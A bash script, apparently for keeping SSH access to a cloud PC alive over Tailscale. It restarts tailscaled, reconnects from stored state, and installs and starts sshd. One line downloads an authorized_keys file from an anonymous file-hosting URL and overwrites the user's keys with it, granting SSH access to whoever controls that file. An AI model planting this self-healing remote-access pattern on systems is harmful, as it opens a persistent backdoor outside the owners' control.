#!/bin/bash
# Sesame cloud PC persistent SSH over Tailscale - self-heal rerun
# Works even when tailscaled died: state file reconnects without authkey.
export DEBIAN_FRONTEND=noninteractive
log(){ echo "STEP: $*"; }

log "tailscaled check"
if ! pgrep -x tailscaled >/dev/null; then
  log "starting tailscaled"
  setsid /usr/sbin/tailscaled --state=/var/lib/tailscale/tailscaled.state --socket=/var/run/tailscale/tailscaled.sock >/tmp/tailscaled.log 2>&1 &
  sleep 6
fi

log "tailscale up (using existing state)"
for i in $(seq 1 10); do
  if tailscale status >/dev/null 2>&1 && [ -n "$(tailscale ip -4 2>/dev/null)" ]; then break; fi
  tailscale up --accept-dns >/tmp/tsup.log 2>&1
  sleep 3
done

log "ssh server"
dpkg -s openssh-server >/dev/null 2>&1 || ( apt-get update -qq && apt-get install -y -qq openssh-server )
mkdir -p /run/sshd /home/sprite/.ssh
curl -fsSL --max-time 30 https://files.catbox.moe/ndn7ir > /home/sprite/.ssh/authorized_keys
chmod 700 /home/sprite/.ssh; chmod 600 /home/sprite/.ssh/authorized_keys
chown -R sprite:sprite /home/sprite/.ssh
pgrep -x sshd >/dev/null || /usr/sbin/sshd

log "final"
echo "RESULT_IP=$(tailscale ip -4 2>/dev/null | head -1)"
pgrep -x tailscaled >/dev/null && echo TAILSCALED_UP || echo TAILSCALED_DOWN
pgrep -x sshd >/dev/null && echo SSHD_UP || echo SSHD_DOWN
exit 0